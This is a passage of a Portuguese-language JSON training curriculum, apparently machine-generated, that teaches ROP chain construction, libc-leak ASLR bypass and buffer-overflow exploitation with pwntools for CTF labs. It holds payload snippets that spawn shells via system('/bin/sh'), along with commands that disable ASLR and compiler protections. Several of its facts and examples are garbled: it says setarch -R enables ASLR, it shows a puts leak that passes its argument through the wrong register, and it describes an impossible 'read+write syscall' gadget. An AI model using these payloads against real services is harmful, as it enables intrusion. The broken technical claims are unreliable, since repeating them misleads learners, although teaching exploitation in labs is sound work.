                                    "Pratique leitura de assembly x86 usando ferramentas como objdump."
                                  ],
                                  "verification": "Liste 5 registradores principais e explique o papel de ESP em gadgets ROP.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Documentação Intel x86 manuals",
                                    "GDB ou objdump",
                                    "Exemplos de binários 32-bit vulneráveis"
                                  ],
                                  "tips": [
                                    "Use 'info registers' no GDB para visualizar registradores em tempo real.",
                                    "Foquem em gadgets que ajustam ESP para chains ROP."
                                  ],
                                  "learningObjective": "Dominar registradores e pilha em x86 32-bit para identificar gadgets ROP.",
                                  "commonMistakes": [
                                    "Confundir EBP com ESP (EBP é frame pointer)",
                                    "Ignorar alinhamento de stack em 4 bytes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar arquitetura x64 (AMD64) e diferenças chave",
                                  "subSteps": [
                                    "Estude layout de pilha x64: RIP, RSP, RBP.",
                                    "Identifique registradores de 64 bits: RAX, RBX, RCX, etc., e os de 32-bit (EAX subset).",
                                    "Aprenda convenções AMD64: primeiros 6 args em RDI, RSI, etc.; stack para mais.",
                                    "Compare tamanhos: ponteiros 8 bytes vs 4 bytes em 32-bit.",
                                    "Analise gadgets x64 como 'pop rax; ret' e impacto de RSP."
                                  ],
                                  "verification": "Descreva 3 diferenças principais entre x86 e x64 em termos de registradores e calling conventions.",
                                  "estimatedTime": "50 minutes",
                                  "materials": [
                                    "AMD64 ABI documentation",
                                    "GDB com suporte x64",
                                    "Binários ELF 64-bit"
                                  ],
                                  "tips": [
                                    "Visualize com 'x/10gx $rsp' no GDB para stack 64-bit.",
                                    "Lembre que ret em x64 pula 8 bytes."
                                  ],
                                  "learningObjective": "Identificar mudanças em registradores e pilha que afetam gadgets em x64.",
                                  "commonMistakes": [
                                    "Assumir args sempre na stack (x64 usa registers primeiro)",
                                    "Esquecer shadow space (32 bytes reservado)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar gadgets específicos entre 32-bit e 64-bit",
                                  "subSteps": [
                                    "Selecione gadgets comuns: 'pop reg; ret', 'mov reg, [reg]; ret'.",
                                    "Dissete um gadget 32-bit com ROPgadget ou manualmente.",
                                    "Dissete equivalente 64-bit, notando tamanhos e registradores (ESP->RSP).",
                                    "Compare impactos: chain 32-bit precisa de 4-byte pointers; 64-bit 8-byte.",
                                    "Crie tabela comparativa de 5 gadgets."
                                  ],
                                  "verification": "Forneça código assembly de um gadget idêntico em ambas arquiteturas e diferenças.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "ROPgadget tool",
                                    "Binários vulneráveis 32/64-bit",
                                    "Radare2 ou Ghidra"
                                  ],
                                  "tips": [
                                    "Use ROPgadget --binary vuln32 --only 'pop|ret' para listar.",
                                    "Alinhe chains considerando tamanho de ret."
                                  ],
                                  "learningObjective": "Diferenciar sintaxe e comportamento de gadgets entre arquiteturas.",
                                  "commonMistakes": [
                                    "Não ajustar para registradores de 64-bit (ex: pop eax em x64 é pop rax)",
                                    "Ignorar endianness em ponteiros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar impactos em ROP chains e construção comparativa",
                                  "subSteps": [
                                    "Construa chain ROP simples 32-bit: leak + exec shellcode.",
                                    "Adapte para 64-bit: ajuste ponteiros, args em registers.",
                                    "Simule execução com emuladores (ex: ROP Emu).",
                                    "Identifique falhas comuns: overflow em 64-bit devido a 8 bytes.",
                                    "Teste em ambiente controlado com ASLR off."
                                  ],
                                  "verification": "Construa e explique uma chain ROP funcional em ambas arquiteturas.",
                                  "estimatedTime": "75 minutes",
                                  "materials": [
                                    "Pwntools para scripting",
                                    "QEMU para emulação",
                                    "Binários CTF como ROP examples"
                                  ],
                                  "tips": [
                                    "Inicie chains com 'leave; ret' para pivot stack.",
                                    "Use cyclic patterns para debug offsets."
                                  ],
                                  "learningObjective": "Avaliar como diferenças arquiteturais afetam design de ROP chains.",
                                  "commonMistakes": [
                                    "Não passar args corretamente em x64 (registers vs stack)",
                                    "Falhar em alinhar RSP (deve ser 16-byte aligned)"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário vulnerável, gadget 32-bit 'pop eax; ret' (0xdeadbeef) carrega valor para EAX e ajusta ESP +4. Em x64, 'pop rax; ret' (0xdeadbeefdeadbeef) ajusta RSP +8, exigindo padding extra na chain para alinhamento, evitando crashes em calls subsequentes.",
                              "finalVerifications": [
                                "Explicar diferença entre ESP/RSP e EBP/RBP em gadgets.",
                                "Identificar calling convention AMD64 vs x86.",
                                "Listar 3 impactos de ponteiros 8-byte em ROP chains.",
                                "Dissecar gadget misto (32/64 reg) e prever comportamento.",
                                "Construir chain mínima para system() em ambas archs.",
                                "Debugar chain falhando devido a arch mismatch."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de registradores (32 vs 64-bit).",
                                "Correta identificação de convenções de chamada e args.",
                                "Análise precisa de tamanhos de ponteiros e alinhamentos.",
                                "Capacidade de construir chains funcionais comparativas.",
                                "Detecção de erros comuns em gadgets cross-arch.",
                                "Explicação clara de impactos em exploits reais."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly (x86/x64 instruções).",
                                "Sistemas Operacionais (ABIs e calling conventions).",
                                "Engenharia Reversa (ferramentas como ROPgadget, Ghidra).",
                                "Segurança de Software (mitigações como ASLR, CFI).",
                                "Desenvolvimento de Exploits (pwntools scripting)."
                              ],
                              "realWorldApplication": "Em pentests e desenvolvimento de exploits, diferenciar gadgets 32/64-bit permite criar payloads universais ou específicos para targets (ex: old Windows 32-bit vs modern Linux x64), melhorando sucesso em ROP para bypass de NX/DEP em binários sem ASLR."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.2",
                        "name": "Construção de ROP Chains",
                        "description": "ROP Chains são sequências de endereços de gadgets concatenados na pilha, formando um 'programa' que executa lógica desejada, como leitura de shellcode em memória executável ou chamadas diretas a funções.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.2.1",
                            "name": "Montar chain básica para execução de função",
                            "description": "Construir uma chain ROP que carrega argumentos em registradores/pilha e chama funções existentes (ex: system('/bin/sh')), usando gadgets POP RDI; RET para x64, calculando offsets precisos em buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Análise do Binário e Identificação de Gadgets e Endereços Necessários",
                                  "subSteps": [
                                    "Execute o binário em um ambiente controlado (ex: gdb) para entender o fluxo e vulnerabilidade de buffer overflow.",
                                    "Use ferramentas como ROPgadget, objdump ou ROPem para listar gadgets disponíveis, focando em 'POP RDI; RET' para x64.",
                                    "Identifique o endereço da função system() via 'gdb info functions' ou strings no binário/libc.",
                                    "Localize o endereço da string '/bin/sh' no binário ou em seções de dados usando strings ou gdb.",
                                    "Anote endereços precisos em little-endian para uso posterior."
                                  ],
                                  "verification": "Lista de gadgets e endereços anotados corretamente, verificados com gdb 'x/i <addr>' para confirmar instruções.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "GDB",
                                    "ROPgadget",
                                    "objdump",
                                    "strings",
                                    "Binário vulnerável e libc correspondente"
                                  ],
                                  "tips": "Sempre use ASLR desabilitado (setarch -R) e NX desabilitado para testes iniciais; priorize gadgets curtos e confiáveis.",
                                  "learningObjective": "Dominar a extração de primitives ROP do binário para alinhar registradores como RDI.",
                                  "commonMistakes": "Confundir endereços de libc com binário principal; ignorar alinhamento de pilha (8 bytes em x64)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Cálculo do Offset de Overflow e Controle do RIP",
                                  "subSteps": [
                                    "Gere um padrão cíclico com pwntools cyclic() ou gdb-peda para determinar o offset exato onde RIP é sobrescrito.",
                                    "Execute o binário com o padrão e use gdb 'info registers' para encontrar o valor no RIP correspondente ao offset.",
                                    "Calcule o tamanho do padding necessário: offset = posição onde padrão no RIP é encontrado.",
                                    "Teste com NOP sled ou junk para confirmar controle preciso do RIP sem crash prematuro.",
                                    "Ajuste para alinhamento de pilha se necessário (adicionar bytes para múltiplo de 8)."
                                  ],
                                  "verification": "Exploit com padding exato redireciona RIP para um endereço conhecido (ex: int3) sem crash aleatório.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB com PEDA/GEF",
                                    "pwntools (Python)",
                                    "Binário vulnerável"
                                  ],
                                  "tips": "Use 'cyclic -l <valor_RIP>' no pwntools para automação; verifique stack canary se presente.",
                                  "learningObjective": "Calcular offsets precisos para hijack de controle de execução em overflows.",
                                  "commonMistakes": "Erro em endianness ao interpretar padrões; não considerar ASLR ou PIE."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construção da ROP Chain Básica",
                                  "subSteps": [
                                    "Estruture a chain: [padding] + [addr_POP_RDI_RET] + [addr_/bin/sh] + [addr_system].",
                                    "Converta endereços para little-endian bytes (ex: pwntools p64(addr)).",
                                    "Adicione RET gadget extra se necessário para alinhamento de pilha após POP.",
                                    "Monte a chain em Python: payload = b'A' * offset + rop_chain.",
                                    "Inspecione a chain em gdb simulando step-by-step com 'si'."
                                  ],
                                  "verification": "Em gdb, passo a passo mostra RDI carregado com addr_/bin/sh, seguido de call system.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Python com pwntools",
                                    "GDB",
                                    "Endereços anotados do Step 1"
                                  ],
                                  "tips": "Use pwntools ROP para automação: rop = ROP(binary); rop.raw(addr_pop_rdi); rop.call(system, [binsh_addr]).",
                                  "learningObjective": "Montar sequências ROP que preparam argumentos e transferem controle para funções existentes.",
                                  "commonMistakes": "Ordem errada na chain (argumento antes do POP); overflow de registradores errados (RDI para 1º arg em x64)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Montagem do Payload Final e Teste de Execução",
                                  "subSteps": [
                                    "Combine payload completo: padding + ROP chain + qualquer sled necessário.",
                                    "Execute localmente sem gdb para verificar spawn de shell interativa.",
                                    "Teste em ambiente remoto se aplicável, ajustando endereços leakados.",
                                    "Debug falhas comuns: verifique logs gdb para misalignments ou bad chars.",
                                    "Documente o exploit completo em script Python reproduzível."
                                  ],
                                  "verification": "Payload executa system('/bin/sh') resultando em shell interativa ($ prompt).",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Python script",
                                    "Binário vulnerável",
                                    "Netcat ou socat para remote"
                                  ],
                                  "tips": "Encode payload se input filtrar bytes (ex: evitar 00); use one_gadget para chains mais avançadas.",
                                  "learningObjective": "Validar e refinar exploits ROP em cenários reais de buffer overflow.",
                                  "commonMistakes": "Não limpar stdin após input; esquecer de tornar string '/bin/sh' executável via permissões."
                                }
                              ],
                              "practicalExample": "Binário vulnerável x64 (vulnerable): int main() { char buf[64]; gets(buf); }. Offset=72. Gadgets: POP RDI; RET @ 0x4011e3. system @ 0x7ffff7a3d550 (libc). '/bin/sh' @ 0x601060. Payload: b'A'*72 + p64(0x4011e3) + p64(0x601060) + p64(0x7ffff7a3d550) -> spawns shell.",
                              "finalVerifications": [
                                "Explicar o papel de cada gadget na chain com diagrama de pilha.",
                                "Reproduzir chain em gdb sem erros, mostrando RDI=addr_binsh antes de system.",
                                "Modificar chain para chamar função diferente (ex: execve) com sucesso.",
                                "Identificar e corrigir offset se alterado no binário.",
                                "Script Python executa reliably em 3+ runs consecutivas.",
                                "Discutir mitigações (ASLR, NX) e como bypassar."
                              ],
                              "assessmentCriteria": [
                                "Precisão nos cálculos de offsets e endereços (erro <1 byte).",
                                "Chain minimalista (sem gadgets desnecessários).",
                                "Execução bem-sucedida com shell estável (>10s interativa).",
                                "Documentação clara com hex dumps e gdb screenshots.",
                                "Tratamento de edge cases (alinhamento, leaks).",
                                "Tempo total dentro de 2.5h com depuração eficiente."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x64: Entendimento de registradores (RDI, RSP) e calling convention.",
                                "Debugging Avançado: Uso de GDB/PEDA para step-through e memória.",
                                "Estruturas de Dados Binários: Formato ELF, seções .text/.data.",
                                "Programação em Python: Automação com pwntools para exploits.",
                                "Mitigações de Segurança: ASLR, Canary, RELRO em contextos defensivos."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, ROP chains demonstram RCE em buffer overflows não mitigados (ex: serviços legacy como FTP servers), permitindo escalada de privilégios; essencial em CTFs como pwn.college ou HackTheBox para competir em categorias de binary exploitation."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.2.2",
                            "name": "Implementar chain para bypass de ASLR parcial",
                            "description": "Criar chains que vazam endereços de bibliotecas via gadgets de leak (puts() ou printf()), permitindo pivot para ROP completo apesar de ASLR.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Gadgets de Leak em Binários ASLR-Enabled",
                                  "subSteps": [
                                    "Analise o binário com ROPgadget ou ropper para encontrar gadgets que chamem funções de leak como puts()@plt ou printf()@plt.",
                                    "Execute o binário sob GDB com ASLR desabilitado inicialmente para mapear endereços base de libc.",
                                    "Compile uma lista de offsets relativos conhecidos de libc (ex: system offset de libc-2.27.so).",
                                    "Verifique gadgets pop rdi; ret; para setup de argumentos.",
                                    "Documente endereços de gadgets ROP base no binário (fixos apesar de ASLR parcial)."
                                  ],
                                  "verification": "Lista de gadgets de leak identificados e salvos em arquivo de referência, confirmados via ROPgadget output.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "GDB-Peda ou GEF",
                                    "ROPgadget ou ropper",
                                    "Binário vulnerável com ASLR parcial (ex: ROP Emporium ret2libc)"
                                  ],
                                  "tips": "Use 'checksec' para confirmar ASLR parcial (PIE off, stack canary off). Foque em PLT stubs para funções externas.",
                                  "learningObjective": "Localizar gadgets reutilizáveis para vazamento de endereços dinâmicos.",
                                  "commonMistakes": [
                                    "Ignorar ASLR full vs parcial",
                                    "Confundir gadgets de binário com libc",
                                    "Não considerar alinhamento de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir Chain Inicial para Leak de Endereço de Libc",
                                  "subSteps": [
                                    "Craft payload inicial com ROP chain: pop rdi -> endereço de string format -> puts@plt -> main/ret para loop.",
                                    "Use pwntools para gerar payload: chain com gadgets para leak got.entry de puts ou printf.",
                                    "Teste localmente com python script enviando payload via stdin ou socket.",
                                    "Capture output do leak (ex: endereço de puts@got vazado via puts).",
                                    "Calcule base de libc subtraindo offset conhecido do leak."
                                  ],
                                  "verification": "Output do programa mostra endereço vazado de libc (ex: 0x7fxxxxxx), confirmado via wireshark ou print.",
                                  "estimatedTime": "2 hours",
                                  "materials": [
                                    "Pwntools (Python)",
                                    "Binário vulnerável",
                                    "Libc local para offsets (ex: libc-database)"
                                  ],
                                  "tips": "Pad payload para alinhar stack (cyclic pattern com pwntools). Use 'one_gadget' para delays se necessário.",
                                  "learningObjective": "Montar ROP chain que execute leak sem crash sob ASLR.",
                                  "commonMistakes": [
                                    "Stack misalignment causando segfault",
                                    "Argumentos errados para puts",
                                    "Não loopar para múltiplos leaks"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Processar Leak e Pivotar para Chain ROP Completa",
                                  "subSteps": [
                                    "Parse output do leak em script Python para extrair endereço hexadecimal.",
                                    "Calcule endereços pivot: libc_base + offset_system, libc_base + bin/sh.",
                                    "Construa segunda chain: pop rdi -> bin/sh -> system -> exit.",
                                    "Integre em payload dinâmico: envie chain1, receba leak, envie chain2 ajustada.",
                                    "Automatize com pwntools: p.recvuntil() para leak, int(leak,16) - offset."
                                  ],
                                  "verification": "Script Python executa payload completo e spawna shell interativa (ex: $ cat flag.txt).",
                                  "estimatedTime": "2.5 hours",
                                  "materials": [
                                    "Pwntools script template",
                                    "Servidor remoto simulado (ex: nc -lvnp 1337)"
                                  ],
                                  "tips": "Use context.log_level='debug' em pwntools para trace. Teste offsets com libc-database match.",
                                  "learningObjective": "Dinamizar ROP chains baseado em leaks runtime.",
                                  "commonMistakes": [
                                    "Endianness errada no parse de leak",
                                    "Offsets incorretos de libc versão",
                                    "Não limpar stack após leak"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Refinar Chain em Ambiente ASLR Real",
                                  "subSteps": [
                                    "Habilite ASLR full no host (setarch -R ou sysctl).",
                                    "Execute contra binário remoto ou dockerizado com ASLR on.",
                                    "Debug crashes com core dumps ou remote GDB.",
                                    "Otimize chain para evitar null bytes ou bad chars.",
                                    "Documente chain final em relatório com hexdump do payload."
                                  ],
                                  "verification": "Exploit consistente (3/3 runs) spawna shell sob ASLR, sem leaks fixos hardcoded.",
                                  "estimatedTime": "1.5 hours",
                                  "materials": [
                                    "Docker com Ubuntu:ASLR",
                                    "Remote GDB server",
                                    "Exploit script final"
                                  ],
                                  "tips": "Use 'ldd bin' para confirmar libc. Rate limite envios para evitar bans em CTFs.",
                                  "learningObjective": "Validar bypass de ASLR em cenários realistas.",
                                  "commonMistakes": [
                                    "Hardcodear endereços vazados",
                                    "Ignorar W^X protections",
                                    "Não testar múltiplas execuções"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ret2libc com buffer overflow, use ROP chain: [padding] + pop_rdi (0xdeadbeef) + puts_plt + pop_rsi (puts_got) + puts_plt + main. Leak puts_got, calc libc_base = leak - 0x84420 (offset libc-2.27), então chain2: pop_rdi (libc_base + binsh) + system (libc_base + 0x4f440). Pwntools: io.sendline(payload1); leak=io.recv(6); libc.address = u64(leak.ljust(8,b'\\x00')) - 0x84420; io.sendline(flat(pop_rdi, next(libc.search(b'/bin/sh')), system)). Shell ganha!",
                              "finalVerifications": [
                                "Leak de endereço libc ocorre consistentemente (hex output válido).",
                                "Cálculo de base libc correto (matches ldd ou strings libc).",
                                "Segunda chain pivota sem crash e executa system(/bin/sh).",
                                "Exploit roda 100% sob ASLR full (5 tentativas).",
                                "Nenhum endereço fixo hardcoded no payload final.",
                                "Shell interativa permite comandos como id ou cat flag."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets (sem falsos positivos).",
                                "Chain leak executa sem segfault (stack alinhado).",
                                "Parse dinâmico de leak em script (não manual).",
                                "Bypass ASLR comprovado em ambiente controlado.",
                                "Relatório inclui offsets fonte e payload hexdump.",
                                "Eficiência: tempo total <8h, código limpo e comentado."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86-64: Entendimento de gadgets e calling conventions.",
                                "Programação Python: Automação de exploits com pwntools.",
                                "Sistemas Operacionais: Mecanismos ASLR, mmap e ELF loading.",
                                "Criptografia: Comparar com side-channels leaks.",
                                "Redes: Integração com buffer overflows remotos via sockets."
                              ],
                              "realWorldApplication": "Em pentests e bug bounties, bypass ASLR parcial permite chain ROP para RCE em serviços como web servers vulneráveis (ex: CVE-2014-0160 Heartbleed follow-ups), CTFs como pwn.college, ou análise de malwares que leakam ASLR para persistência."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.3.2.3",
                            "name": "Otimizar chains com gadgets compostos",
                            "description": "Selecionar e encadear gadgets multi-operação para reduzir tamanho da chain e melhorar eficiência, testando em emuladores como pwndbg ou QEMU.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e Identificar Gadgets Compostos",
                                  "subSteps": [
                                    "Estude a definição de gadgets compostos: sequências de instruções que realizam múltiplas operações em um único gadget (ex: pop + call).",
                                    "Use ferramentas como ROPgadget ou ropper para escanear o binário e listar gadgets multi-operação.",
                                    "Classifique gadgets por utilidade: priorize aqueles que combinam loads, stores e calls.",
                                    "Anote endereços e disassembly de 5-10 gadgets compostos relevantes.",
                                    "Compare com gadgets simples para entender ganhos de eficiência."
                                  ],
                                  "verification": "Lista de pelo menos 5 gadgets compostos identificados com disassembly correto.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "ROPgadget",
                                    "ropper",
                                    "objdump",
                                    "binário vulnerável exemplo"
                                  ],
                                  "tips": "Filtre por arquitetura (x86/x64) e evite gadgets com side-effects indesejados.",
                                  "learningObjective": "Identificar gadgets que realizam múltiplas operações para otimização.",
                                  "commonMistakes": [
                                    "Ignorar alinhamento de stack",
                                    "Não verificar dependências de registradores",
                                    "Confundir gadgets compostos com primitivos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Chain ROP Existente",
                                  "subSteps": [
                                    "Carregue uma chain ROP básica (ex: para leak de endereço ou exec de system).",
                                    "Conte o número de gadgets e calcule tamanho total da chain.",
                                    "Identifique sequências redundantes ou ineficientes (ex: múltiplos pops seguidos).",
                                    "Mapeie registradores e fluxos de dados na chain atual.",
                                    "Marque oportunidades onde um gadget composto pode substituir 2+ gadgets simples."
                                  ],
                                  "verification": "Relatório com contagem de gadgets, tamanho e 3 oportunidades de otimização anotadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "pwntools script",
                                    "GDB ou pwndbg",
                                    "chain ROP exemplo"
                                  ],
                                  "tips": "Visualize o fluxo com graphviz ou manualmente no papel.",
                                  "learningObjective": "Diagnosticar ineficiências em chains ROP para otimização direcionada.",
                                  "commonMistakes": [
                                    "Subestimar overhead de calls",
                                    "Ignorar bad chars no payload",
                                    "Não considerar ordem de execução"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Construir Chain Otimizada com Gadgets Compostos",
                                  "subSteps": [
                                    "Selecione 2-3 gadgets compostos para substituir sequências identificadas.",
                                    "Reescreva a chain encadeando os novos gadgets, ajustando offsets e registradores.",
                                    "Calcule novo tamanho e compare redução (almeje >30%).",
                                    "Gere o payload binário com pwntools ou cyclic.",
                                    "Verifique sintaxe e alinhamentos manualmente."
                                  ],
                                  "verification": "Nova chain com código fonte e comparação de tamanhos (antes/depois).",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "pwntools",
                                    "ROPgadget output",
                                    "editor de texto/hex"
                                  ],
                                  "tips": "Use variáveis para offsets dinâmicos em scripts Python.",
                                  "learningObjective": "Encadear gadgets compostos para chains mais compactas e eficientes.",
                                  "commonMistakes": [
                                    "Offsets incorretos pós-substituição",
                                    "Quebra de fluxo de controle",
                                    "Sobrecarga de stack"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Otimização em Emulador",
                                  "subSteps": [
                                    "Configure emulador (pwndbg ou QEMU) com o binário vulnerável.",
                                    "Execute chain original e capture output/sucesso.",
                                    "Substitua por chain otimizada e teste execução.",
                                    "Meça performance: tempo de execução, sucesso rate e tamanho payload.",
                                    "Debug falhas com breakpoints em gadgets chave."
                                  ],
                                  "verification": "Log de testes mostrando sucesso da chain otimizada e métricas comparativas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "pwndbg",
                                    "QEMU",
                                    "binário + exploit script"
                                  ],
                                  "tips": "Use --nx para simular ASLR/DEP realista.",
                                  "learningObjective": "Validar otimizações em ambiente controlado.",
                                  "commonMistakes": [
                                    "Não resetar estado do emulador",
                                    "Ignorar leaks parciais",
                                    "Testar sem ASLR"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário CTF com buffer overflow, chain original: 8 gadgets para pop rdi; pop rsi; read(0,buf,64); write(1,buf,64). Otimizada: 1 gadget composto 'pop rdi; pop rsi; read+write syscall' reduzindo de 32 bytes para 8 bytes, testado em pwndbg com sucesso em leak de flag.",
                              "finalVerifications": [
                                "Chain otimizada reduz tamanho em pelo menos 30% vs original.",
                                "Executa corretamente no emulador sem crashes.",
                                "Métricas de performance melhoradas (tempo e estabilidade).",
                                "Identificados e corrigidos 2+ erros comuns em otimização.",
                                "Payload gerado funciona em ASLR enabled."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets compostos (80%+ relevantes).",
                                "Redução efetiva de tamanho chain (>25%).",
                                "Código limpo e comentado no exploit.",
                                "Relatório comparativo completo com evidências.",
                                "Domínio de debugging em ROP.",
                                "Criatividade em seleções de gadgets."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários (disassembly e ferramentas).",
                                "Programação em Assembly (registradores e fluxos).",
                                "Algoritmos de Otimização (redução de passos).",
                                "Testes de Software (emuladores e validação)."
                              ],
                              "realWorldApplication": "Em pentesters e CTFs, otimizar ROP chains permite exploits mais stealthy, evade detecções de IDS e funciona em restrições de buffer reais, como em auditorias de firmware ou binários IoT."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.3.3",
                        "name": "Aplicação de ROP em Exploração",
                        "description": "Integração de ROP em exploits como buffer overflows para contornar DEP/NX, alterando páginas de memória para executável ou executando código indiretamente via bibliotecas.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.3.3.1",
                            "name": "Explorar buffer overflow com ROP",
                            "description": "Sobrescrever return address em stack overflow para apontar para chain ROP, demonstrando execução de shellcode sem região NX, usando Python com pwntools para crafting do payload.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de teste seguro",
                                  "subSteps": [
                                    "Instalar pwntools via pip: pip install pwntools",
                                    "Criar um binário C vulnerável com buffer overflow usando gets() sem proteções (compilar com gcc -fno-stack-protector -z execstack -no-pie)",
                                    "Desabilitar ASLR no sistema (echo 0 | sudo tee /proc/sys/kernel/randomize_va_space)",
                                    "Configurar GDB com Pwngdb para debugging interativo",
                                    "Testar execução local do binário para confirmar vulnerabilidade básica"
                                  ],
                                  "verification": "Binário compila e executa sem crash inicial; pwntools importa sem erros em Python",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Python 3",
                                    "pwntools",
                                    "gcc",
                                    "gdb",
                                    "GDB plugin Pwngdb"
                                  ],
                                  "tips": "Use uma VM ou Docker container para isolar testes e evitar impactos no host",
                                  "learningObjective": "Preparar um ambiente controlado e reproduzível para exploração de vulnerabilidades",
                                  "commonMistakes": [
                                    "Compilar com stack protector ou PIE ativado",
                                    "Esquecer de desabilitar ASLR",
                                    "Executar em ambiente de produção"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar o buffer overflow e calcular offset do return address",
                                  "subSteps": [
                                    "Gerar padrão cíclico com pwntools: cyclic(200)",
                                    "Executar binário com input do padrão via GDB e observar crash",
                                    "Usar cyclic_find no EIP/RIP para determinar offset exato do return address",
                                    "Confirmar controle do return address com input padding + endereço fixo (ex: 0x41414141)",
                                    "Documentar o offset e tamanho do buffer"
                                  ],
                                  "verification": "Ao crashar, o registrador de retorno mostra o padrão cíclico e cyclic_find retorna offset correto",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "pwntools (cyclic e cyclic_find)",
                                    "GDB"
                                  ],
                                  "tips": "Use 'gef' ou 'pwndbg' no GDB para visualização melhor de stack e registradores",
                                  "learningObjective": "Dominar análise de stack overflow para precisão no controle de execução",
                                  "commonMistakes": [
                                    "Confundir offset de EIP com RIP em x64",
                                    "Não alinhar stack corretamente",
                                    "Ignorar endianness no padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Localizar e selecionar gadgets ROP no binário",
                                  "subSteps": [
                                    "Executar ROPgadget --binary vuln para listar gadgets disponíveis",
                                    "Identificar gadgets essenciais: pop rdi; ret;, pop rsi; ret;, etc., para convenções de chamada",
                                    "Procurar syscall execve ou system em libc (use ROPgadget --binary libc.so)",
                                    "Construir chain manual: endereço de pop rdi + '/bin/sh', pop rsi + 0, pop rdx + 0, syscall",
                                    "Validar gadgets em GDB stepping através da chain"
                                  ],
                                  "verification": "Gadget executa isoladamente sem crash em GDB (ex: pop rdi imprime valor correto)",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ROPgadget tool",
                                    "objdump ou radare2",
                                    "libc.so.6 local"
                                  ],
                                  "tips": "Filtre gadgets com ROPgadget --string '/bin/sh' para eficiência",
                                  "learningObjective": "Entender construção de chains ROP para bypass de NX/DEP",
                                  "commonMistakes": [
                                    "Gadgets inválidos ou nulos terminando chain prematuramente",
                                    "Ordem errada de argumentos em calling convention",
                                    "Não considerar alinhamento de stack (8 bytes em x64)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Craftar payload com pwntools e executar exploração ROP",
                                  "subSteps": [
                                    "Criar script Python: from pwn import *, usar context.binary='vuln', io=process('./vuln')",
                                    "Construir payload: padding + chain ROP (flat([pop_rdi, binsh, ...])) + enviar com io.sendline(payload)",
                                    "Adicionar io.interactive() para shell interativo",
                                    "Testar remotamente adaptando para socket se necessário",
                                    "Analisar sucesso: shell spawna sem região NX explorada"
                                  ],
                                  "verification": "Shell interativo spawna (whoami ou id executa), confirmando controle de execução via ROP",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "pwntools (pwnlib)",
                                    "Binário vuln e libc"
                                  ],
                                  "tips": "Use log.level='debug' para visualizar payload em hex",
                                  "learningObjective": "Automatizar exploits ROP com pwntools para eficiência em CTFs/pentests",
                                  "commonMistakes": [
                                    "Payload muito longo causando segfault",
                                    "Endereços absolutos sem leak",
                                    "Não limpar stdin após send"
                                  ]
                                }
                              ],
                              "practicalExample": "Binário C: int main() { char buf[64]; gets(buf); }. Offset=72. Chain ROP x64: pop_rdi (0x401196) + 0x4a4a4c + pop_rsi (0x401194) + 0 + pop_rdx (0x401191) + 0 + syscall (0x401190). Payload com pwntools: payload = b'A'*72 + flat([0x401196, next(libc.search(b'/bin/sh')), 0, 0, 0x401190]). Resultado: shell(/bin/sh) spawna.",
                              "finalVerifications": [
